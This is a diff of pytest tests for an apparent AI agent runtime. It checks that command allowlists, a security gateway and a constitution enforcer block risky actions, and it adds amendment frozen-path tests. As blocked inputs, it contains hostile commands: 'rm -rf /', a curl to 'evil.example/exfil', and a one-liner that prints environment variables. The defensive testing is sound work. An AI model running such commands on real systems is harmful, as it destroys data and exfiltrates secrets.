@@ -242,7 +242,9 @@ def test_run_command_is_fail_closed_to_verification_allowlist(
     and recorded as a durable blocked_attempt."""
     # The allowlist check (the property under test) is independent of the execution
     # backend; pin host so the permitted command runs in-process without Docker.
-    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    monkeypatch.setattr(
+        "aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host"
+    )
     workspace = _workspace(tmp_path)
     runtime_root = tmp_path / "runtime"
     allowed_cmd = f"{sys.executable} -m pytest --version"
@@ -265,7 +267,9 @@ def test_run_command_is_fail_closed_to_verification_allowlist(
     # An undeclared command is fail-closed blocked, even though run_command is
     # an allowed tool — this is the regression the review flagged.
     with pytest.raises(ContractViolation):
-        runtime.run_command([sys.executable, "-c", "import os; print(dict(os.environ))"])
+        runtime.run_command(
+            [sys.executable, "-c", "import os; print(dict(os.environ))"]
+        )
     assert any(
         attempt["tool"] == "run_command"
         and "verification_commands" in attempt["reason"]
@@ -309,7 +313,9 @@ def test_spawner_refuses_duplicate_mission_id(tmp_path: Path) -> None:
         asyncio.run(WorkerSpawner(runtime_root=runtime_root).run(contract))
 
 
-def test_spawner_refuses_contract_that_violates_its_declared_caste(tmp_path: Path) -> None:
+def test_spawner_refuses_contract_that_violates_its_declared_caste(
+    tmp_path: Path,
+) -> None:
     """WorkerSpawner.run() routes every contract through
     ConstitutionEnforcer.check_caste_spawn before a mission dir is claimed or
     a subprocess exists -- a forager (read-only research) contract declaring
@@ -351,7 +357,9 @@ def test_run_command_rechecks_security_gateway_at_exec_boundary(
     COUNCIL_REASONING, so contract membership alone is not proof of operator
     intent -- the frozen RED gateway is re-checked at the exec boundary,
     where RED is never executable regardless of any contract or approval."""
-    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    monkeypatch.setattr(
+        "aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host"
+    )
     workspace = _workspace(tmp_path)
     runtime_root = tmp_path / "runtime"
     red_cmd = "rm -rf /"
@@ -383,7 +391,9 @@ def test_run_command_gateway_recheck_blocks_network_egress(
     interpreter-based verification commands stay runnable (covered by
     test_run_command_is_fail_closed_to_verification_allowlist's allowed_cmd,
     which flows through the same re-check and still returns 0)."""
-    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    monkeypatch.setattr(
+        "aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host"
+    )
     workspace = _workspace(tmp_path)
     runtime_root = tmp_path / "runtime"
     egress_cmd = "curl http://evil.example/exfil"
@@ -416,7 +426,9 @@ def test_run_command_gateway_recheck_still_blocks_shell_spawn(
     stays in jurisdiction. Meanwhile `python -c "import sys; sys.exit(1)"`
     style commands (semicolon as literal argv data) run fine -- covered by
     test_runtime_gaps' worker tests."""
-    monkeypatch.setattr("aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host")
+    monkeypatch.setattr(
+        "aios.runtime.worker_api.config.APPROVED_EXECUTION_BACKEND", "host"
+    )
     workspace = _workspace(tmp_path)
     runtime_root = tmp_path / "runtime"
     shell_cmd = "sh -c 'echo a; echo b'"
@@ -437,4 +449,68 @@ def test_run_command_gateway_recheck_still_blocks_shell_spawn(
     assert any(
         attempt["tool"] == "run_command" and "escape" in attempt["reason"]
         for attempt in runtime.blocked_attempts
+    )
+
+
+# --- organ 45: a ratified amendment must reach the spawner's enforcer --------
+
+
+def test_spawner_enforcer_applies_an_amendments_frozen_path(tmp_path) -> None:
+    """A ratified amendment's frozen path must be enforced, not merely recorded.
+
+    `WorkerSpawner` built `ConstitutionEnforcer()` bare, so `amended_frozen_paths`
+    was always empty and an ACTIVATED amendment adding a frozen path changed the
+    recorded constitution and nothing about enforcement. The enforcer's own
+    comment records that exact failure being "found by the fourth red-team
+    campaign" -- it grew a `snapshot` parameter, and this caller never passed one.
+
+    The snapshot is applied as a UNION with live config, so this also pins the
+    strengthen-only direction: an amendment can ADD a frozen prefix and can never
+    drop one the config already declares.
+    """
+    from aios.domain.governance.constitution import build_constitution_snapshot
+    from aios.runtime.spawner import WorkerSpawner
+
+    amended = build_constitution_snapshot(ratified_by_operator_id="operator")
+    amended = amended.model_copy(
+        update={"frozen_paths": tuple(amended.frozen_paths) + ("docs/amended_zone",)}
+    )
+
+    spawner = WorkerSpawner(
+        runtime_root=tmp_path / "runtime", constitution_snapshot=amended
+    )
+    enforcer = spawner.constitution_enforcer
+
+    amended_decision = enforcer.check_file_edit("docs/amended_zone/thing.md")
+    assert amended_decision.allowed is False, (
+        "an activated amendment's frozen path must be refused through the "
+        "spawner's own enforcer"
+    )
+    assert amended_decision.risk == "RED"
+
+    # Strengthen-only: the live config's frozen core is still refused, and an
+    # ordinary path is still allowed.
+    assert enforcer.check_file_edit("aios/security/gateway.py").allowed is False
+    assert enforcer.check_file_edit("docs/ordinary.md").allowed is True
+
+
+def test_spawner_without_a_snapshot_still_refuses_the_live_frozen_core(
+    tmp_path,
+) -> None:
+    """Degrading to no snapshot must never DROP a frozen path.
+
+    Snapshot resolution is best-effort: `get_active_snapshot()` needs an enrolled
+    sovereign and a writable store, and a worker spawn must not fail without
+    them. This pins that the fallback is no worse than before -- the live
+    config's frozen core is still enforced.
+    """
+    from aios.runtime.spawner import WorkerSpawner
+
+    spawner = WorkerSpawner(runtime_root=tmp_path / "runtime2")
+
+    assert (
+        spawner.constitution_enforcer.check_file_edit(
+            "aios/security/audit_logger.py"
+        ).allowed
+        is False
     )
